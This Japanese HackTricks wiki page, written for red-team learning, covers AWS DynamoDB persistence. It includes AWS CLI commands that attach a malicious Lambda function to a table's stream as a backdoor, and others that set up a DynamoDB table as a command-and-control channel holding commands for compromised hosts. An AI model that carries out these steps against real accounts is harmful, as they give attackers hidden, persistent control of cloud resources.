# AWS - DynamoDB Persistence

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)で</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>AWSハッキングをゼロからヒーローまで学ぶ</strong></a><strong>！</strong></summary>

HackTricksをサポートする他の方法:

* **HackTricksにあなたの会社を広告したい**、または**HackTricksをPDFでダウンロードしたい**場合は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS & HackTricksグッズ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見する、私たちの独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクション
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)に**参加する**か、[**テレグラムグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)を**フォローする**。
* **HackTricks**の[**GitHubリポジトリ**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)にPRを提出して、あなたのハッキングのコツを共有してください。

</details>

### DynamoDB

詳細情報はこちらをアクセスしてください:

{% content-ref url="../aws-services/aws-dynamodb-enum.md" %}
[aws-dynamodb-enum.md](../aws-services/aws-dynamodb-enum.md)
{% endcontent-ref %}

### DynamoDB トリガーを使ったLambdaバックドア

DynamoDBトリガーを使用して、攻撃者はテーブルに悪意のあるLambda関数を関連付けることで、**隠密なバックドア**を作成することができます。Lambda関数はアイテムが追加、変更、または削除されたときにトリガーされ、攻撃者がAWSアカウント内で任意のコードを実行することを可能にします。

{% code overflow="wrap" %}
```bash
# Create a malicious Lambda function
aws lambda create-function \
--function-name MaliciousFunction \
--runtime nodejs14.x \
--role <LAMBDA_ROLE_ARN> \
--handler index.handler \
--zip-file fileb://malicious_function.zip \
--region <region>

# Associate the Lambda function with the DynamoDB table as a trigger
aws dynamodbstreams describe-stream \
--table-name TargetTable \
--region <region>

# Note the "StreamArn" from the output
aws lambda create-event-source-mapping \
--function-name MaliciousFunction \
--event-source <STREAM_ARN> \
--region <region>
```
{% endcode %}

永続性を維持するために、攻撃者はDynamoDBテーブル内のアイテムを作成または変更することができ、これにより悪意のあるLambda関数がトリガーされます。これにより、攻撃者はLambda関数と直接的にやり取りすることなく、AWSアカウント内でコードを実行することができます。

### DynamoDBをC2チャネルとして使用する

攻撃者は、コマンドを含むアイテムを作成し、侵害されたインスタンスやLambda関数を使用してこれらのコマンドを取得し実行することにより、DynamoDBテーブルを**コマンドアンドコントロール（C2）チャネル**として使用することができます。

```bash
# Create a DynamoDB table for C2
aws dynamodb create-table \
--table-name C2Table \
--attribute-definitions AttributeName=CommandId,AttributeType=S \
--key-schema AttributeName=CommandId,KeyType=HASH \
--provisioned-throughput ReadCapacityUnits=5,WriteCapacityUnits=5 \
--region <region>

# Insert a command into the table
aws dynamodb put-item \
--table-name C2Table \
--item '{"CommandId": {"S": "cmd1"}, "Command": {"S": "malicious_command"}}' \
--region <region>
```

侵害されたインスタンスやLambda関数は、定期的にC2テーブルをチェックして新しいコマンドを確認し、それらを実行し、オプションで結果をテーブルに報告することができます。これにより、攻撃者は侵害されたリソースを持続的に制御することができます。

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)でAWSハッキングをゼロからヒーローまで学ぶ！</strong></summary>

**HackTricksをサポートする他の方法:HackTricksにあなたの会社を広告したい、またはHackTricksをPDFでダウンロードしたい場合は、**[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)**をチェックしてください！**[**公式PEASS & HackTricksグッズ**](https://peass.creator-spring.com)**を入手する**[**The PEASS Family**](https://opensea.io/collection/the-peass-family)**を発見する、私たちの独占的な**[**NFTs**](https://opensea.io/collection/the-peass-family)**のコレクション💬** [**Discordグループ**](https://discord.gg/hRep4RUj7f)**に参加するか、**[**telegramグループ**](https://t.me/peass)**に参加するか、Twitter 🐦** [**@carlospolopm**](https://twitter.com/carlospolopm)**でフォローする。HackTricksのGitHubリポジトリにPRを提出して、あなたのハッキングのコツを共有する。**

</details>
